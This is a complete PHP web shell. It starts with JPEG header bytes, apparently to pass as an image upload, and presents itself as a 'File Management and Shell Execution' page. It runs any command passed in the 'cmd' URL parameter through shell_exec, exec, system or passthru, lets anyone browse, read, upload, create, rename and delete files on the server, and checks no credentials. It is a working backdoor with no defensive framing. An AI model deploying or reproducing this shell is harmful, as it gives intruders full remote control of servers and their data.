ÿØÿàOCTYPE html>
<html>
<head>
    <title>File Management and Shell Execution</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            padding: 20px;
        }
        .file-list a {
            display: block;
        }
        .file-list.dir-link {
            font-weight: bold;
        }
        .file-actions {
            float: right;
        }
        pre {
            background: #f8f9fa;
            padding: 15px;
            border: 1px solid #dee2e6;
            border-radius:.25rem;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>File Management and Shell Execution</h1>
    <div class="mb-3">
        <label for="dir" class="mr-2">Directory:</label>
        <?php
        $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
        $dirParts = explode(DIRECTORY_SEPARATOR, $dir);
        $currentPath = '';

        foreach ($dirParts as $index => $part) {
            if ($part === '') continue;  // Skip empty parts
            $currentPath .= DIRECTORY_SEPARATOR . $part;
            echo '<a href="?dir=' . urlencode($currentPath) . '" class="btn btn-link">' . $part . '</a>';
            if ($index < count($dirParts) - 1) {
                echo ' / ';
            }
        }
        ?>
    </div>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>" class="form-inline mb-3">
        <div class="form-group mr-2">
            <label for="cmd" class="mr-2">Command:</label>
            <input type="text" class="form-control" name="cmd" id="cmd" size="80" autofocus>
        </div>
        <input type="submit" class="btn btn-primary" value="Execute">
    </form>
    <a class="btn btn-primary" data-toggle="collapse" href="#directory_content" role="button" aria-expanded="false" aria-controls="directory_content">+</a>
    <div class="collapse" id="directory_content">
        <h3>Current Directory Contents</h3>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>File</th>
                    <th>Creation Date</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
<?php
    if (isset($_GET['dir'])) {
        $dir = $_GET['dir'];
        if (is_dir($dir)) {
            chdir($dir);
        } else {
            echo "<tr><td colspan='4'>Invalid directory: $dir</td></tr>";
        }
    } else {
        $dir = getcwd();
    }

    function get_file_list($dir) {
        $files = scandir($dir);
        $file_list = [];
        $directories = [];
        $regular_files = [];
        
        foreach ($files as $file) {
            if ($file == '.') continue;
            if ($file == '..') {
                $file_list[] = [
                    'name' => '<a href="?dir=' . urlencode(dirname($dir)) . '" class="dir-link">[Parent Directory]</a>',
                    'permissions' => '',
                    'creation_date' => '',
                    'actions' => '',
                ];
                continue;
            }
            $full_path = $dir . DIRECTORY_SEPARATOR . $file;
            $file_info = [
                'path' => $full_path,
                'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
                'creation_date' => date("Y-m-d H:i:s", filectime($full_path)),
            ];

            if (is_dir($full_path)) {
                $directories[] = [
                    'name' => '<a href="?dir=' . urlencode($full_path) . '" class="dir-link">[DIR] ' . $file . '</a>',
                    'permissions' => $file_info['permissions'],
                    'creation_date' => $file_info['creation_date'],
                    'actions' => "<a href=\"?dir=" . urlencode($full_path) . "\" class=\"btn btn-sm btn-primary\">Open</a>",
                ];
            } else {
                $regular_files[] = [
                    'name' => '<a href="?dir=' . urlencode($dir) . '&filename=' . urlencode($file) . '">' . $file . '</a>',
                    'permissions' => $file_info['permissions'],
                    'creation_date' => $file_info['creation_date'],
                    'actions' => "<a href=\"?dir=" . urlencode($dir) . "&open=" . urlencode($file) . "\" class=\"btn btn-sm btn-success\">Open</a> " .
                                 "<a href=\"?dir=" . urlencode($dir) . "&rename=" . urlencode($file) . "\" class=\"btn btn-sm btn-warning\">Rename</a> " .
                                 "<a href=\"?dir=" . urlencode($dir) . "&delete=" . urlencode($file) . "\" class=\"btn btn-sm btn-danger\">Delete</a>",
                ];
            }
        }
        
        return array_merge($file_list, $directories, $regular_files);
    }

    $files = get_file_list(getcwd());
    foreach ($files as $file) {
        echo "<tr>";
        echo "<td>{$file['name']}</td>";
        echo "<td>{$file['creation_date']}</td>";
        echo "<td>{$file['permissions']}</td>";
        echo "<td>{$file['actions']}</td>";
        echo "</tr>";
    }
?>
            </tbody>
        </table>
    </div>
    <div>
        <h3>Create or Upload File</h3>
        <form method="POST" enctype="multipart/form-data" class="form-inline mb-3">
            <div class="form-group mr-2">
                <label for="create_filename" class="mr-2">Create File:</label>
                <input type="text" class="form-control" name="create_filename" id="create_filename" placeholder="Filename">
            </div>
            <div class="form-group mr-2">
                <input type="text" class="form-control" name="create_content" id="create_content" placeholder="Content">
            </div>
            <input type="submit" class="btn btn-primary" value="Create">
        </form>
        <form method="POST" enctype="multipart/form-data" class="form-inline mb-3">
            <div class="form-group mr-2">
                <label for="upload_file" class="mr-2">Upload File:</label>
                <input type="file" class="form-control form-control-lg" name="upload_file" id="upload_file">
            </div>
            <input type="submit" class="btn btn-primary" value="Upload">
        </form>
    </div>
    <pre><code class="<?php echo isset($_GET['open']) ? 'language-' . pathinfo($_GET['open'], PATHINFO_EXTENSION) : '' ?>" ref="codeRef">
<?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (isset($_POST['create_filename']) && isset($_POST['create_content'])) {
            $create_filename = $_POST['create_filename'];
            $create_content = $_POST['create_content'];
            file_put_contents($create_filename, $create_content);
            echo "File '$create_filename' created with content: $create_content\n";
        }

        if (isset($_FILES['upload_file'])) {
            $upload_file = $_FILES['upload_file']['name'];
            $upload_tmp = $_FILES['upload_file']['tmp_name'];
            if (move_uploaded_file($upload_tmp, $upload_file)) {
                echo "File '$upload_file' uploaded successfully.\n";
            } else {
                echo "Failed to upload file '$upload_file'.\n";
            }
        }
    }

    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        $output = '';
        $methods = ['shell_exec', 'exec', 'system', 'passthru'];
        foreach ($methods as $method) {
            $result = '';
            switch ($method) {
                case 'shell_exec':
                    $result = shell_exec($cmd);
                    $retval = $result === null ? 1 : 0;
                    break;
                case 'exec':
                    exec($cmd, $output_array, $retval);
                    $result = implode("\n", $output_array);
                    break;
                case 'system':
                    ob_start();
                    system($cmd, $retval);
                    $result = ob_get_clean();
                    break;
                case 'passthru':
                    ob_start();
                    passthru($cmd, $retval);
                    $result = ob_get_clean();
                    break;
            }
            if ($retval === 0) {
                $output = "Executed with $method:\n$result";
                break;
            }
        }
        if ($retval !== 0) {
            $output = "Command execution failed for all methods.";
        }
        echo $output;
    }

    if (isset($_GET['open'])) {
        $file_path = getcwd() . DIRECTORY_SEPARATOR . $_GET['open'];
        if (file_exists($file_path)) {
            $file_contents = htmlentities(file_get_contents($file_path));
            echo "<h3>File Contents: {$_GET['open']}</h3>";
            echo "<pre>$file_contents</pre>";
        } else {
            echo "File '{$_GET['open']}' does not exist.\n";
        }
    }

    if (isset($_GET['rename'])) {
        $oldname = $_GET['rename'];
       ?>
        <script>
            var oldname = "<?php echo $oldname?>";
            var newname = prompt("Enter new name for file '" + oldname + "':", oldname);
            if (newname!= null) {
                window.location.href = "?dir=<?php echo urlencode($dir)?>&rename=<?php echo urlencode($oldname)?>&newname=" + encodeURIComponent(newname);
            } else {
                window.location.href = "?dir=<?php echo urlencode($dir)?>";
            }
        </script>
        <?php
        exit;
    } else if (isset($_GET['newname'])) {
        $oldname = $_GET['rename'];
        $newname = $_GET['newname'];
        $oldpath = getcwd(). DIRECTORY_SEPARATOR. $oldname;
        $newpath = getcwd(). DIRECTORY_SEPARATOR. $newname;
        if (rename($oldpath, $newpath)) {
            echo "File '$oldname' renamed to '$newname'.\n";
        } else {
            echo "Failed to rename file '$oldname'.\n";
        }
    }

    if (isset($_GET['delete'])) {
        $file_path = getcwd() . DIRECTORY_SEPARATOR . $_GET['delete'];
        if (file_exists($file_path)) {
            if (unlink($file_path)) {
                echo "File '{$_GET['delete']}' deleted.\n";
            } else {
                echo "Failed to delete file '{$_GET['delete']}'.\n";
            }
        } else {
            echo "File '{$_GET['delete']}' does not exist.\n";
        }
    }
?>
    </code></pre>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script>hljs.highlightAll();</script>
</body>
</html>
